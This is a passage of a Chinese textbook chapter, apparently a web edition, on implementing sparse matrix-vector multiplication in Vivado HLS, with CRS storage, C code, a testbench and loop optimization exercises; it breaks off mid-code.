作为一种数据结构，由3个数组组成。值(<strong>values</strong>)数组保存矩阵中非零元素的值。列索引(<strong>columnIndex</strong>)数组和行指针（<strong>rowPtr</strong>）数组对非零元素的位置信息进行编码。列索引存储每一列的元素，行指针包含每一行第一个元素的值。<strong>CRS</strong> 结构避免存储矩阵中的0值，确实在数值数组中确实没有存储0。但是在这个例子中，虽然数值数组不保存0，但是列索引数组和行指针数组作为标记信息，表示了矩阵的形态。<strong>CRS</strong> 广泛用于大型的矩阵但是仅仅有少量的非零元素（少于10%或者更低），这样可以简化这类矩阵的存储以及相关的运算。</p><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/crs.jpg" alt="图 6.1: M是一个4x4矩阵，用两种方式表示：同&quot;密集&quot;矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。">图 6.1: M是一个4x4矩阵，用两种方式表示：同”密集”矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。</p><p>但是，CRS对矩阵的稀疏性没有要求，可以适用于任何矩阵。作为一种针对矩阵的通用方法，但不见得是最高效的。CRS结构也不见得是表示稀疏矩阵最高效的方式，其他稀疏矩阵表示方法也在被使用。</p><p>更准确的讲，CRS作为一种数据结构由3个数组构成：<strong>值</strong>(<strong>values</strong>)、<strong>列索引</strong>(<strong>colIndex</strong>)、<strong>行索引</strong>（<strong>rowPtr</strong>）。值数组和列索引表示稀疏矩阵<strong>M</strong>中的每一个非零元素，这些数组表示矩阵<strong>M</strong>采用行的方式，从左到右，从上到下。矩阵中的数据保存在值数组中，列索引数组保存数据在数组中水平方向的位置，如果 <strong>values[k]</strong> 表示 M_{ij}<em>M<strong>i</strong>j</em> 其中collndex[k]= j<em>c<strong>o</strong>l<strong>l</strong>n<strong>d</strong>e**x</em>[<em>k</em>]=<em>j</em>。数组<strong>rowPtr</strong>用n+1<em>n</em>+1的长度来表示n行矩阵。<strong>rowPtr[k]</strong> 表示在行k之前，矩阵中所有元素的数目，其中rowPtr[0]=0<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[0]=0且最后一个元素<strong>rowPtr[k]</strong> 总是表示当前矩阵k行之前所有非零元素的个数M_{ij}<em>M<strong>i</strong>j</em> ,其中rowPtr[i] \leq k \leq rowPtr[i+1]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]≤<em>k</em>≤<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]。如果行k包含任何非0元素，那么<strong>rowPtr[k]</strong> 将包含当前行的第一个元素。注意，如果当前行没有非0元素，那么 <strong>rowPtr</strong> 数组中的值将会重复出现。</p><p>从图<strong>6.1</strong> a）中，我们可以行优先的方式遍历矩阵，从而确定值（<strong>values</strong>）数组在<strong>CRS</strong>中的形式。只要发现一个非0元素，它的值会被保存在下一个索引 i<em>i</em> 中，同时，它的列号<strong>columnIndex[i]</strong> 会被保存在列数组中。另外，在我们访问一个新行的时候，我们保存下一个值的索引 i<em>i</em> 在<strong>rowPtr</strong>数组中。所以，<strong>rowPtr</strong> 数组的第一个元素总是0。从图 6.1 b)中，我们可以把矩阵转换为二位数组表示的方式。第一步是根据<strong>rowPtr</strong>数组，确定每一行中非0 元素的个数。对行 i<em>i</em> 而言，该行中元素的数目为rowPtr[i]-rowPtr[i+1]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]−<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]的差值。所以当前行的值可以从<strong>values</strong>数组<strong>values[rowPtr[i]]</strong> 开始，通过递归得到。在我们的示例矩阵中，因为前 <strong>rowPtr</strong> 数组前2个元素是0和2，所以我们知道第一行有2个非0元素，即<strong>value[0]</strong> 和<strong>value[1]</strong> 。第一个非0元素在<strong>values</strong>数组中,<strong>value[0]</strong> 是3。该值所对应的列号为1，因为columnIndex[0]=0<em>c<strong>o</strong>l<strong>u</strong>m<strong>n</strong>I<strong>n</strong>d<strong>e</strong>x</em>[0]=0。以此类推，矩阵中第二行元素的个数为k\in[2,4)<em>k</em>∈[2,4),第三行的元素个数为k \in [4,7)<em>k</em>∈[4,7)。最后，共有9个非0元素在矩阵中，所以<strong>rowPtr</strong>最后一个值是9。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">        DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span>&#123;</span><br><span class="line">L1: <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_ROWS; i++) &#123;</span><br><span class="line">        DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">    L2: <span class="keyword">for</span> (<span class="keyword">int</span> k = rowPtr[i]; k &lt; rowPtr[i+<span class="number">1</span>]; k++) &#123;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">pragma</span> HLS unroll factor=8</span></span><br><span class="line">            <span class="meta">#<span class="meta-keyword">pragma</span> HLS pipeline</span></span><br><span class="line">            y0 += values[k] * x[columnIndex[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        y[i] = y0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。">图6.2: 主体代码演示了系数矩阵向量乘（SpMV）y=M.x的计算。采用CRS的方式，通过rowPt*、columnIndex 和 value 保存矩阵M。第一个for循环通过迭代访问每一行，第二个for循环访问每一列，实现矩阵M中非0元素和向量中对应的元素相乘并保存值在向量y中。</p><p>给定一个二维数组表示一个矩阵，通过C代码实现矩阵CRS格式。编写对应的C代码实现将矩阵从CRS格式转化为二维数组的形式。</p><p>结果表明，通过采用<strong>CRS</strong>的方式，我们能高效的实现稀疏矩阵乘法，不需要将矩阵转化为二维形式。实际上， 对于大型的矩阵仅仅只有一小部分非0元素，稀疏矩阵向量乘法会比第四章中讨论的密集矩阵向量乘高效很多。因为我们直接找到非0元素，并执行非0元素对应的运算。</p><h3 id="6-2-基本实现"><a href="#6-2-基本实现" class="headerlink" title="6.2 基本实现"></a>6.2 基本实现</h3><p>图6.2 提供了基本代码对系数矩阵乘法的实现。函数<strong>spmv</strong>函数有5个参数，分别是<strong>rowPtr</strong>、<strong>columnIndex</strong> ，以及 <strong>values</strong> 对应矩阵 <strong>M</strong> 的 <strong>CRS</strong> 格式中包含的3个参数，这和图6.1中描述的数据结构等价。参数 y<em>y</em> 用于保存输出的结果，参数x表示输入的被乘向量x<em>x</em>。变量<strong>NUM_ROWS</strong>表示矩阵<strong>M</strong>中行号。变量<strong>NNZ</strong>表示矩阵中非0元素的个数。最后，变量SIZE表示数组x和数组y中元素的个数。</p><p>外层<strong>for</strong>循环标签为<strong>L1</strong>，对矩阵的行进行遍历。将矩阵当前的行与向量x相乘，得到输出的结果y<em>y</em>。内层循环标签为<strong>L2</strong>，实现对矩阵<strong>M</strong>中每列元素的遍历。L2循环迭代计算rowPtr[i+1]-rowPtr[i]<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>+1]−<em>r<strong>o</strong>w<strong>P</strong>t**r</em>[<em>i</em>]计算每一行非0元素的个数。每次循环计算，能从<strong>value</strong>数组中读取矩阵M的非0元素然后对应的从x数组中取得被乘向量x的值，对应相乘。<strong>cloumnIndex[k]</strong> 中的值保存了对应的列号<strong>k</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __SPMV_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SPMV_H__</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> SIZE = <span class="number">4</span>; <span class="comment">// SIZE of square matrix</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> NNZ = <span class="number">9</span>; <span class="comment">//Number of non-zero elements</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> NUM_ROWS = <span class="number">4</span>;<span class="comment">// SIZE;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> DTYPE;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">          DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// __MATRIXMUL_H__ not defined</span></span></span><br></pre></td></tr></table></figure><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.3： spmv函数和激励的头文件">图6.3： spmv函数和激励的头文件</p><h3 id="6-3-测试平台"><a href="#6-3-测试平台" class="headerlink" title="6.3 测试平台"></a>6.3 测试平台</h3><p>图6.4 展示了一个针对<strong>spmv</strong>函数测试平台。测试平台通过定义<strong>matrixvector</strong>函数，直接实现矩阵向量乘法，它不考虑矩阵是否为稀疏矩阵以及矩阵是否采用<strong>CRS</strong>方式表示。我们比较<strong>matrixvector</strong>函数输出和<strong>spmv</strong>函数的输出。</p><p>在通常的测试平台中，需要实现的函数都会有个“黄金”参考，作为用户期望综合的结果。测试平台会比较黄金用例的输出和通过<strong>Vivado®HLS</strong>综合的代码执行结果。最好的实践方式是，测试平台既可以用于黄金用例，也可用于被综合的代码。这样就保证了两者实现的正确性。</p><p>测试平台在主函数<strong>main</strong>中执行。这里我们通过设置<strong>fail</strong>变量初始化为0，当<strong>spmv</strong>函数的输出成结果与<strong>matrixvector</strong>函数输出结果不相同是时，变量置1。定义与矩阵<strong>M</strong>相关的变量、被乘向量x<em>x</em> 和输出结果y<em>y</em>。对于矩阵<strong>M</strong>，即有普通模式，也有<strong>CSR</strong>模式（保存为<strong>values</strong>、<strong>columnIndex</strong>、<strong>rowPtr</strong>）。矩阵<strong>M</strong> 的<strong>value</strong>如图6.1中所示，输出向量y<em>y</em>有两种，其中y_sw数组保存<strong>matrixvector</strong>函数输出的结果，y数组保存<strong>spmv</strong>函数输出的结果。</p><p>在定义好所有的输入变量和输出变量之后，分别调用<strong>spmv</strong>函数和<strong>matrixvector</strong>函数并输入合适的数据。 接下来的<strong>for</strong>循环用于比较y_sw和y中的每一个对应的结果。如果其中一个不相同，则将<strong>fail</strong> 标志置1。最后，程序会打印测试的结果并返回<strong>fail</strong>变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">matrixvector</span><span class="params">(DTYPE A[SIZE][SIZE], DTYPE *y, DTYPE *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; i++) &#123;</span><br><span class="line">        DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SIZE; j++)</span><br><span class="line">            y0 += A[i][j] * x[j];</span><br><span class="line">        y[i] = y0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fail = <span class="number">0</span>;</span><br><span class="line">    DTYPE M[SIZE][SIZE] = &#123;&#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,&#123;<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line">    DTYPE x[SIZE] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    DTYPE y_sw[SIZE];</span><br><span class="line">    DTYPE values[] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> columnIndex[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> rowPtr[] = &#123;<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    DTYPE y[SIZE];</span><br><span class="line"></span><br><span class="line">    spmv(rowPtr, columnIndex, values, y, x);</span><br><span class="line">    matrixvector(M, y_sw, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SIZE; i++)</span><br><span class="line">        <span class="keyword">if</span>(y_sw[i] != y[i])</span><br><span class="line">            fail = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fail == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"FAILED\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"PASS\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/placeholder.png" alt="图6.4 ： 一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。">图6.4 ： 一个简单spmv函数的简单测试平台。测试平台生成了一个用例，并且计算矩阵的向量乘法通过稀疏矩阵乘法（spmv）和非系数矩阵乘法(matrixvector)。</p><p>这个测试平台相对简单并且可能无法充分验证所有的输入都能正常输出。最主要的原因是，它仅仅只用了一个矩阵作为例子，相反，一个好的激励会测试许多矩阵。通常，会通过随机的方式产生输入的测试用例，并且重点测试边界用例。在这个例子中，我们不仅要保证值正确计算，同时保证通过加速器正确的被执行了，而且编译时间相关的parameter改变会在实现不同加速单元值折中。最关键的是，在相同的parameter上，我们能通过随机产生很多输入数据来进行测试。编译时间相关的参数每次发生变化，都需要我们重新编译代码。</p><p>创建一个复杂的激励来，通过随机数方式生成许多组测试数据。稀疏矩阵编译时间参数应该是可以修改的（例如，<strong>SIZE</strong>，<strong>NNZ</strong> 等）。创建一个HLS综合脚本，在编译时间参数合理范围改变时，能执行代码很多次。</p><h3 id="6-4-指定循环的属性"><a href="#6-4-指定循环的属性" class="headerlink" title="6.4 指定循环的属性"></a>6.4 指定循环的属性</h3><p>如果直接将上述代码进行综合，我们可以得到函数运行的时钟周期及资源占用率。但是，我们不能得到模块执行所需的时钟周期、任务执行的延迟和任务执行之间的间隔。因为这些都取依赖于输入数据，由<strong>spmv</strong>函数外部因素决定。最主要的因素是，内层循环执行的次数是由矩阵<strong>M</strong>中非0元素个数决定的。非0元素的个数在代码中是由常量<strong>NNZ</strong>决定的，虽然可以调用函数计算不同大小的矩阵，但是实际迭代次数是和输入数据相关的。另外，性能也会因为非0元素的分布、综合优化的约束产生不同。更复杂的是，迭代的次数由输入决定，许多可能的输入并没有被遍历。所以，对于工具而言，不通过复杂的分析和额外的信息，工具是不能知道spmv函数执行需要多少时钟周期。<strong>Vivado®HLS</strong> 工具也不能进行上述的分析。</p><p>spmv函数能正常工作的前提条件是什么？证明给定的前提条件，矩阵中每个非0元素实是不是在对应一次内层循的执行？</p><p>有几种方式能帮助工具进行性能的分析，其中一种方式就是想<strong>Vivado®HLS</strong>提供循环边界的额外信息。这可以通过使用<strong>loop_tripcount</strong> directive实现，它能让设计者指定最小、最大和平均迭代次数针对特定的循环。通过提供这些值， <strong>Vivado®HLS</strong> 能提供时钟周期级别的评估。</p><p>使用<strong>loop_tripcount</strong> directive 用变量指定循环的最小，最大和平均迭代次数，这样<strong>Vivado</strong>®HLS 工具能对当前设计时钟周期数目进行估计。这些不影响最后综合的结果，只会影响综合报告。</p><p>对spmv函数使用<strong>loop_tripcount</strong> directive，语法格式 # pragma HLS loop_tripcount min=X, max=Y, avg=Z 其中X，Y，Z正的常量。哪个循环需要使用directive?当改变参数（min、max和avg）以后，综合报告有什么不同？这对时钟周期有影响吗？这对资源占用有影响吗？</p><p><strong>loop_tripcount</strong> 引导能帮助设计者对函数的性能有个原始的估计。这样能比较相同的函数通过使用不同的directives或者对代码本身重构。但是，这不能确定<strong>min</strong>、<strong>max</strong>和 <strong>avg</strong> 参数。这也很难确定边界条件min和max的值。如果有测试平台，就有一种更准确的方式用于计算<strong>spmv</strong>函数执行的时钟周期数，那就是<strong>C/RTL</strong>协同仿真。</p><h3 id="6-5-C-RTL-协同仿真"><a href="#6-5-C-RTL-协同仿真" class="headerlink" title="6.5 C/RTL 协同仿真"></a>6.5 C/RTL 协同仿真</h3><p><strong>C/RTL</strong> 协同仿真能自动化测试Vivado®HLS工具生成的RTL代码，只需要在综合的时候提供测试平台。每次执行综合以后的代码和提供的测试平台，记录输入和输出结果。输入的值按照时钟转换成<strong>输入向量</strong>。这里的输入向量用于针对生成的RTL代码进行仿真，同时记录<strong>输出向量</strong>。更新综合后的代码， 再次运行测试平台并保存输入和输出数据。测试平台如果返回值是0，则表示成功；若激励返回非0值，则表示失败。</p><p><strong>C/RTL</strong> 协同仿真流程将VIvado®HLS 生成的<strong>RTL</strong>代码，通过C 测试平台，实现时钟周期级别的仿真。这样，就能准确对生成的<strong>RTL</strong>代码进行性能评估，即使性能与输入数据有关。被综合的函数运行周期最小值，最大值，平均值以及间隔在仿真完成以后都能准确的得到。</p><p>注意这些和时钟周期相关的参数是通过激励中测试数据得到的。所以，结果的质量和测试平台的质量息息相关。如果测试平台没有很好的对函数执行测试，那么结果将不准确。另外，输入测试向量都是基于理想的时序，不能反映模型实际工作时，外部接口对函数的影响。实际的性能可能会比仿真的要低，如果执行过程中阻塞在输入数据或对外部存储的访问上。不过，对于循环边界调试时变量的情况，设计者可以通过协同仿真的方式确定时钟周期个数。</p><p>C/RTL协同仿真能提供循环边界是变量的函数的延迟。它反馈函数运行时延迟的最小值、最大值和平均值以及函数运行间隔。这些延迟和测试平台输入的数据是强相关的。</p><p><img src="https://xupsh.github.io/pp4fpgas-cn/images/spmv_behavior.jpg" alt="图6.5  spmv函数内部循环流水执行过程和结构">图6.5 spmv函数内部循环流水执行过程和结构</p><p>当采用图6,4提供的测试平台时，函数运行的最小值、最大值和平均值以及函数间隔是多少个时钟周期？</p><h3 id="6-6-循环的优化与数组的分块"><a href="#6-6-循环的优化与数组的分块" class="headerlink" title="6.6 循环的优化与数组的分块"></a>6.6 循环的优化与数组的分块</h3><p>我们可以通过<strong>Vivado®HLS</strong> 工具得到当前函数的性能和面积的评估结果，然后可以考虑如何对函数进行优化。流水线、循环展开、数组分块是第一类最常用的优化方法。最典型的方式是从最内层的循环，然后根据需要向外层循环进行。</p><p>在这个例子中， 对最内层的<strong>L2</strong>循环进行流水线化也许是我们最先和最容易想到的优化方式。这个连续迭代的循环在执行上流水以后，总体运行会加快。如果不采用流水，<strong>L2</strong> 循环将按照串行执行。注意，<strong>L1</strong> 循环此时还是按照串行的方式执行。</p><p>图6.5演示了<strong>spmv</strong>函数在<strong>L2</strong>循环采用流水方式时运行的步骤。每次<strong>L2</strong>的循环都被II=3<em>I**I</em>=3流水化。流水线允许在外层循环执行一次迭代时，内层循环执行多次循环迭代。此时，内层循环II受限于递归（recurrence ）操作。II=3<em>I**I</em>=3是因为我们认为加法器有3个时钟周期的延迟。外部循环没有采用流水的方式，所以内层的循环必须在下外层L2循环开始执行前，计算完成并输出结果。</p><p>对最内层的L2 <strong>for</strong> 循环进行流水化，通过在spmv函数中增加流水directive如图6.2所示。II(initiation interval)最后是多少？在你指定II的值以后，最终目标的II值是增大了还是减少了？</p><p>观察执行步骤，我们可以发现有几个因素限制了循环执行性能。第一个因素，递归（recurrence ）操作限制了循环的 <strong>II</strong>。第二个因素，外层的循环没有采用流水的方式。一种高效计算稀疏矩阵向量乘法的方式，每个时钟周期把乘法器和加法器使用起来。当前的设计离这个目标还很远。</p><p>在章节4.3中，我们探究了几种设计优化技术，其中包括对不同的循环进行流水，循环展开，数组分割。掌握在这些技术之间进行权衡是一项挑战，因为它们之间经常相互依赖。我们通常联合使用这些技术，为了得到好的性能谨慎的选择其中一种而不选择另一种也许结果会更糟糕。例如，在我们使用循环展开是，设计者需要明白它对数据访问的影响。增加了对数据访问的操作但是设计性能又受限于数据访问时，优化毫无益处。同样，如果提供了冗余的存储端口，实际中使用率不高，这样对提高性能毫无帮助反而增加了资源的消耗。</p><p>仔细思考一下上述优化技术组合后复杂多变的样式，我们建议你尝试下面的练习：</p><p>对spmv设计进行综合，采用表6.1提供的10种directives，每种都有不同的流水，展开和分割针对不同的循环和数组。这些分割在不同的数组（values、columnIndex、x）上使用。你看到结果的趋势是如何的？增加了展开和分割，是有利于还是不利于面积？性能如何？为什么？</p><p> 表6.1 稀疏矩阵向量乘法可优化的方式</p><table><thead><tr><th></th><th>L1</th><th>L2</th></tr></thead><tbody><tr><td>case1</td><td>-</td><td>-</td></tr><tr><td>case2</td><td>-</td><td>pipeline</td></tr><tr><td>case3</td><td>pipeline</td><td>-</td></tr><tr><td>case4</td><td>unroll=2</td><td>-</td></tr><tr><td>case5</td><td>-</td><td>pipeline,unroll=2</td></tr><tr><td>case6</td><td>-</td><td>pipeline,unroll=2,cyclic=2</td></tr><tr><td>case7</td><td>-</td><td>pipeline,unroll=4</td></tr><tr><td>case8</td><td>-</td><td>pipeline,unroll=4,cyclic=4</td></tr><tr><td>case9</td><td>-</td><td>pipeline,unroll=8</td></tr><tr><td>case10</td><td>-</td><td>pipeline,unroll=8,cyclic=8</td></tr><tr><td>case11</td><td>-</td><td>pipeline,unroll=8,block=8</td></tr></tbody></table><p>如果你完成了上述练习，你会发现盲目的使用优化directives，可能不会得到你期望的结果。通常在设计时， 在思考下考虑应用的特性，选择针对设计的特定优化方式。当然，这也需要一些直觉能力和一些专用工具投入使用。虽然，搞清楚像<strong>Vivado®HLS</strong>这样复杂工具中每一个细节是困难乃至不可能的，但是我们能基于关键的方面建立思考模型。</p><p>上面我们在用例3和4中考虑对外层循环<strong>L1</strong>进行流水化操作而不是对内层循环。这种变化针对一个任务，可以提高潜在的并行程度。为了完成优化，<strong>Vivado®HLS</strong> 工具必须展开代码中所有的内层循环<strong>L2</strong> 。如果循环能全部展开，这样能减少计算循环边界的时间，同时也能消除递归（recurrences）。但是代码中的内层循环Vivado HLS是无法完全展开的，因为循环边界不是常量。</p><p>例如在实现上面提到的例子3，在最外层的循环<strong>L1</strong>使用流水化directive。在不设定目标<strong>II</strong>时，<strong>II</strong>值是多少？资源占用率发生了什么变化？增加了<strong>II</strong>后资源占用率结果如何？这与之前采对L2循环进行流水化，结果有什么不同？这和最基本的设计（无 directives）相比有什么不同？当你对外层循环进行展开时，结果到底如何？（提示：检查综合后的日志信息）</p><p>另外一种增加并行化的方式是对内层循环进行局部循环展开，就像之前例子5到10。这种变化实现更多的并行化，通过在相同的循环迭代中，执行更多的操作。有些情况，Vivado HLS 工具在对内层循环进行流水化时，通过实现更多操作来提高性能。但是，这还是很难提高内层循环的II，由于内层循环的递归操作。但是，在II大于1的情况下， 许多操作可以共享同一个计算单元。</p><p>图6.6展示了一个局部展开的代码。在这段代码中，<strong>L2</strong> 循环被分成2个循环，分别为<strong>L2_1</strong>和<strong>L2_2</strong>。最内层的循环<strong>L2_2</strong>执行的次数由参数<strong>S</strong>确定。内部循环包含了最原始的<strong>L2</strong>循环，其中循环边界是由最原始的<strong>L2</strong>循环确定的。代码中，<strong>L2_1</strong> 循环包含了不确定次数的乘法和加法操作，运算次数由参数<strong>S</strong>确定，和一次递归完成累加y0 += yt<em>y</em>0+=<em>y**t</em>。</p><p>注意图<strong>6.6</strong>中的代码和自动循环展开的代码是由一点点区别的。自动循环展开复制计算，但是保留每次计算先后顺序（除了当前的例子）。这就导致了计算顺序由内层循环决定，如图6.7左所示。对计算顺序进行调整后，操作上的依赖关系如图6.7 左边所示。在当前的代码中，最后累加求和是一个递归（recurrence ）。当使用浮点数据类型时，这种调整计算顺序的操作可能对程序产生改变，所以Vivado HLS对这种类型的代码不进行操作顺序自动调整。</p><p>这个设计可能会被综合、实现如图<strong>6.8</strong>所示的结果。在这个例子中，S=3<em>S</em>=3与II<em>I**I</em>最匹配，乘法器的延迟正好是3。所有的运算过程都是在一个乘法器和加法器上执行。比较这个例子与图<strong>6.5</strong>中的例子，我们可以发现一些缺点。最明显的是，内层循环的流水线长度很长，实现的时候需要多个更多的周期刷新流水线的输出，才能执行下一次外层<strong>L1</strong>循环。处理一行中非零元素和执行块<strong>S</strong> 相同。一行有个3个元素和一行有一个元素计算的时间是相同的。剩下的运算也需要在循环流水线中执行，即使他们的结果没有用。为了严格的比较两个设计的特性，我们需要了解设计对矩阵每行非零元素个数的预期。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"spmv.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> S = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spmv</span><span class="params">(<span class="keyword">int</span> rowPtr[NUM_ROWS+<span class="number">1</span>], <span class="keyword">int</span> columnIndex[NNZ],</span></span></span><br><span class="line"><span class="function"><span class="params">          DTYPE values[NNZ], DTYPE y[SIZE], DTYPE x[SIZE])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  L1: <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_ROWS; i++) &#123;</span><br><span class="line">      DTYPE y0 = <span class="number">0</span>;</span><br><span class="line">    L2_1: <span class="keyword">for</span> (<span class="keyword">int</span> k = rowPtr[i]; k &lt; rowPtr[i+<span class="number">1</span>]; k += S) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> HLS pipeline II=S</span></span><br><span class="line">          DTYPE yt = values[k] * x[columnIndex[k]];</span><br><span class="line">      L2_2: <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; S; j++) &#123;</span><br><span class="line">              <span class="keyword">if</span>(k+j &lt; rowPtr[i+<span 